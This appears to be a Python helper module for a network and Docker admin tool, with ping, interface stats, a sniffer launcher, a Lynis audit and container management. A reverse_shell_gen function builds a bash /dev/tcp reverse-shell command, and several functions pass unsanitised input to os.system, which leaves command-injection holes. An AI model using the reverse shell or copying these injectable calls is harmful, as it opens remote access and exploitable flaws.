import socket
import os
import subprocess
import psutil

from visual import *


def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  # no inet_pton here
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

    return True


def is_valid_ipv6_address(address):
    try:
        socket.inet_pton(socket.AF_INET6, address)
    except socket.error:  # not a valid address
        return False
    return True


def ping(address):
    response = os.system("ping -c 1 " + address)
    if response == 0:
        print("Woo it is alive")
    else:
        print("it sure is stinky in here, cause its dead. ")


def network_config():
    network = psutil.net_io_counters(pernic=True)
    ifaces = psutil.net_if_addrs()
    networks = list()
    for k, v in ifaces.items():
        ip = v[0].address
        data = network[k]
        ifnet = dict()
        ifnet['ip'] = ip
        ifnet['iface'] = k
        ifnet['sent'] = '%.2fMB' % (data.bytes_sent / 1024 / 1024)
        ifnet['recv'] = '%.2fMB' % (data.bytes_recv / 1024 / 1024)
        ifnet['packets_sent'] = data.packets_sent
        ifnet['packets_recv'] = data.packets_recv
        ifnet['errin'] = data.errin
        ifnet['errout'] = data.errout
        ifnet['dropin'] = data.dropin
        ifnet['dropout'] = data.dropout
        networks.append(ifnet)
    return networks


def network_pretty_print():
    network = network_config()
    #   Name: $value IP: $value stats:[packets_sent / packets received]
    for items in network:
        print("Name: " + items['iface'] + " IP: " + items['ip'] + " Stats: [ sent/receive :" + items['sent'] + "/" +
              items['recv'] + "]")


def network_iface_list():
    network = network_config()
    network_names = []
    for items in network:
        network_names.append(items['iface'])
    return network_names


def network_sniffer(network, filter_statement):
    os.system("sudo python3 netplay.py " + network + filter_statement)

def reverse_shell_gen(ip, port):
    cmd = ""
    cmd = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return cmd

def verify_docker_installation() -> bool:
    result = subprocess.Popen(["docker", "-v"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result.wait()
    if result.returncode == 0:
        # print("docker is installed")
        return True
    else:
        # print("I believe that docker is not installed.")
        return False


def verify_installed(name) -> bool:
    result = subprocess.Popen([name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0:
        return True
    else:
        return False


def system_audit():
    if verify_installed("git"):
        if os.path.isdir("./lynis"):
            os.system("rm -rf lynis")
        else:
            os.system("git clone https://github.com/CISOfy/lynis")
            if os.path.isdir("./lynis"):
                os.system("cd lynis/ && ./lynis audit system > ../system_audit.txt")
                print("System Audit is complete -- Check your audit report")
                os.system("cd ..")


def find_docker_names() -> list:
    names = list()
    result = subprocess.run(["docker", "ps"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    resultparse = result.stdout.split("\n")
    for lines in resultparse:
        if len(lines) != 0:
            linesplit = lines.split()
            names.append(linesplit[0])
    if names[0] == 'CONTAINER':
        names.pop(0)
    return names


def find_docker_compose_file_print():
    if verify_docker_installation():
        names = find_docker_names()
        print("------------------------------------------\n"
              "Docker Containers Compile files can be found at: \n")
        for items in names:
            container_inspect = subprocess.run(["docker", "container", "inspect", items, "--format",
                                                "\'{{ index .Config.Labels \"com.docker.compose.project.working_dir\" }}\'"],
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print("{} : {}".format(items, container_inspect.stdout))


def find_docker_compose_file_list():
    final_compose_file = []
    temp = []
    if verify_docker_installation():
        names = find_docker_names()
        print("------------------------------------------"
              "Docker Containers Compile files can be found at: ")
        for items in names:
            container_inspect = subprocess.run(["docker", "container", "inspect", items, "--format",
                                                "\'{{ index .Config.Labels \"com.docker.compose.project.working_dir\" }}\'"],
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            temp.append(container_inspect.stdout.strip().strip("'"))
    for paths in temp:
        if paths not in final_compose_file:
            final_compose_file.append(paths)
    return final_compose_file


def docker_ps():
    result = subprocess.run(["docker", "ps"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result.stdout)


# kill hanging docker instance
def docker_kill():
    docker_process = proc_find("docker-compose")
    docker_pid = pid_find(docker_process)
    if len(docker_pid) > 0:
        for items in docker_pid:
            print("killing {} with a SIGTERM signal".format(items))
            os.kill(items, 15)
        waiting(25)
    else:
        print("No process ID has been successfully located")
        unique_path = find_docker_compose_file_list()
        for path in unique_path:
            docker_compose_file = path + "/docker-compose.yml"
            result = os.system("docker-compose -f " + docker_compose_file + " down &")
            waiting(30)
            print("Docker Kill attempt has been made")


# make a system to build based on a path
def docker_build(dir_path):
    files_in_directory = []
    if os.path.isdir(dir_path):
        files_in_directory = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
        if files_in_directory.count("docker-compose.yml") == 1:
            full_path = os.path.abspath(os.path.join(dir_path, "docker-compose.yml"))
            result = os.system("docker-compose -f " + full_path + " up &")
            waiting(25)
        else:
            print("There is an error in detecting your docker-compose file")
    else:
        print("Something is wrong with your path")


# make a system to build based on a path
def docker_restart():
    unique_path = find_docker_compose_file_list()
    for path in unique_path:
        if os.path.isdir(path):
            docker_compose_file = path + "/docker-compose.yml"
            result = os.system("docker-compose -f " + docker_compose_file + " down &")
            waiting(30)
            building = os.system("docker-compose -f " + docker_compose_file + " build &")
            waiting(25)
            upagain = os.system("docker-compose -f " + docker_compose_file + " up &")


# get a list of all the pids given a partial substring match
def proc_find(process_name):
    list_of_proc = []
    for proc in psutil.process_iter():
        try:
            p_info = proc.as_dict(attrs=['pid', 'name', 'create_time'])
            if process_name.lower() in p_info['name'].lower():
                list_of_proc.append(p_info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return list_of_proc


def pid_find(list_of_proc):
    list_of_process_by_name = list_of_proc
    list_of_pid = []
    if len(list_of_process_by_name) > 0:
        for elem in list_of_process_by_name:
            process_id = elem['pid']
            list_of_pid.append(process_id)
    return list_of_pid


# help with common build tasks resources(common commands and what they mean, maybe they go into the help box)
def docker_learn():
    print("--------------------------------------------------------------\n"
          "-------------------Docker short cheatsheet--------------------\n"
          "--------------------------------------------------------------\n"
          "\n"
          "Docker compose common commands:\n"
          "\n"
          "docker-compose start ------------------- Start existing container from a service\n"
          "docker-compose stop -------------------- Stops running containers without removing them\n"
          "docker-compose pause ------------------- pauses running containers of service\n"
          "docker-compose unpause ----------------- unpauses paused containers of a service\n"
          "docker-compose ps ---------------------- lists all containers\n"
          "docker-compose up ---------------------- Builds, (re)create, start and attaches to container for a service\n"
          "docker-compose down -------------------- Stops containers and removes containers, networks created by up\n"
          "\n"
          "Docker Container management commands: \n"
          "\n"
          "docker create (image) [ command ] ------ create the container\n"
          "docker run (image) [ command ] --------- create and start a container\n"
          "docker start (container) --------------- start the container\n"
          "docker stop (container) ---------------- stop a container using SIGTERM and SIGKILL 10 seconds later\n"
          "docker kill (container) ---------------- Kill the container using a SIGKILL\n"
          "docker restart (container) ------------- stop the container and start it again\n"
          "docker pause (container) --------------- suspend the container\n"
          "docker unpause (container) ------------- resume the container\n"
          "docker rm [-f] (container) ------------- destroy the container, -f remove running container\n"
          "\n"
          "Docker inspection: \n"
          "\n"
          "docker ps ------------------------------ list running containers\n"
          "docker ps -a --------------------------- list all containers \n"
          "docker logs [-f] (container) ----------- show the container output (stdout + stderr)\n"
          "docker top (container) [ps option] ----- list the processes running inside the container\n"
          "docker diff (container) ---------------- show the differences with the image (modified file)\n"
          "docker inspect (container) ------------- show low-level infos (json format)\n"
          )
